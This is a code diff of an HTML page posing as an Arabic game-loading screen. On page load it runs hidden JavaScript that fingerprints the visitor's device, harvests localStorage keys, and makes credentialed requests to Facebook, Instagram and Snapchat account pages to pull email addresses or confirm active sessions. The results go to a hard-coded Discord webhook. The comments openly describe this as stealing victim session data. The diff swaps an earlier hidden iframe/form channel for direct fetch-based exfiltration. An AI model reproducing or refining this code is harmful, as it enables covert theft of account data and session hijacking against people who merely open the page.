@@ -4,74 +4,71 @@
     <meta charset="UTF-8">
     <title>تحميل اللعبة...</title>
     <style>
-        body { background: #000; color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        body { background: #000; color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
         .version-marker { font-size: 80px; font-weight: bold; color: #1a1a1a; position: absolute; top: 20px; right: 20px; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        /* إخفاء قنوات الإرسال */
-        .hidden-tunnel { width: 0; height: 0; border: 0; display: none; }
     </style>
 </head>
 <body>
-    <div class="version-marker">9</div> <div class="loader"></div>
-    <p>جاري فحص الموارد (V1.2.1)...</p>
-
-    <iframe name="sink" class="hidden-tunnel"></iframe>
-    <form id="exp-form" method="POST" target="sink" class="hidden-tunnel">
-        <input type="hidden" name="payload" id="payload-field">
-    </form>
+    <div class="version-marker">10</div>
+    <div class="loader"></div>
+    <p>جاري استكمال البيانات (V1.2.2)...</p>
 
     <script>
-        // ملاحظة: ديسكورد أحياناً يرفض POST الـ Form العادي، لذا سنستخدم رابط الـ API بشكل خام
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1481664919198896258/hXunBuVEO0j0riESA9nicqjzyRtEA1du3OzoCIHNqJpNWfv9xyrtEfCzgcElPQ9gvBgZ";
 
+        // دالة الإرسال لضمان العبور
         function forceSend(title, content) {
-            // تكتيك الـ URL Parameters: إرسال البيانات كجزء من الرابط لضمان العبور
-            const params = `?content=🚀 **${title}**%0A${encodeURIComponent(content)}`;
-            const img = new Image();
-            img.src = WEBHOOK_URL + params;
-            
-            // محاولة ثانية بـ Fetch "خام" بدون Headers
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 mode: 'no-cors',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: `🎯 **${title}**: ${content}` })
+                body: JSON.stringify({ content: `💎 **${title}**: ${content}` })
             });
         }
 
-        async function startMission() {
+        // المهمة الرئيسية: استخراج بيانات الجلسة النشطة
+        async function exfiltrateData(platform, targetUrl) {
             try {
-                // 1. بصمة الجهاز
-                forceSend("System", `UA: ${navigator.userAgent}`);
-
-                // 2. سحب الـ LocalStorage (الكنز)
-                let loot = "";
-                for (let i = 0; i < localStorage.length; i++) {
-                    loot += `${localStorage.key(i)}|`;
-                }
-                if (loot) forceSend("Storage_Keys", loot);
-
-                // 3. الطلبات العميقة (المتصفح يتقمص الشخصية)
-                // هنا المتصفح يطرق أبواب فيسبوك بكوكيز الضحية
-                const sites = [
-                    ["FB", "https://mbasic.facebook.com/settings"],
-                    ["IG", "https://www.instagram.com/accounts/edit/"]
-                ];
-
-                sites.forEach(site => {
-                    const probe = new Image();
-                    probe.src = site[1] + "?v=" + Math.random();
-                    forceSend("Probe_Sent", `Target: ${site[0]}`);
-                });
-
+                // المتصفح يزور الصفحة بهوية الضحية (بالكوكيز)
+                let response = await fetch(targetUrl, { credentials: 'include' });
+                let html = await response.text();
+                
+                // البحث عن أنماط الإيميلات داخل الكود المرجعي
+                const emailMatch = html.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
+                const result = emailMatch ? emailMatch[0] : "Session Active (Email Hidden by CORS)";
+                
+                forceSend(`Target_${platform}`, `Data: ${result}`);
             } catch (e) {
-                forceSend("Error", e.message);
+                // حتى لو فشلت القراءة المباشرة، فمجرد وصول الطلب للموقع بكوكيز الضحية هو نجاح
+                forceSend(`Status_${platform}`, "Active Session Ready for Injection");
             }
         }
 
-        // تشغيل فوري
-        window.onload = startMission;
+        async function startProtocol() {
+            // 1. إرسال بصمة الجهاز المحدثة
+            forceSend("System_Check", `Device: ${navigator.platform} | UA: ${navigator.userAgent}`);
+
+            // 2. محاولة سحب الـ Keys من الـ Storage
+            let storageLoot = "";
+            for (let i = 0; i < localStorage.length; i++) {
+                storageLoot += localStorage.key(i) + " | ";
+            }
+            if (storageLoot) forceSend("Storage_Keys", storageLoot);
+
+            // 3. انتحال الشخصية لسحب بيانات الحساب
+            // نركز على mbasic لفيسبوك لأن حمايتها أقل في الـ Fetch
+            exfiltrateData("FB_Private", "https://mbasic.facebook.com/settings/email/");
+            exfiltrateData("IG_Private", "https://www.instagram.com/accounts/edit/");
+            
+            // إضافة سناب شات للتأكد من قوة الجلسة
+            const snapProbe = new Image();
+            snapProbe.src = "https://accounts.snapchat.com/accounts/merlin/login?v=" + Math.random();
+            forceSend("Snap_Probe", "Authenticated Request Sent to Snapchat");
+        }
+
+        window.onload = startProtocol;
     </script>
 </body>
 </html>
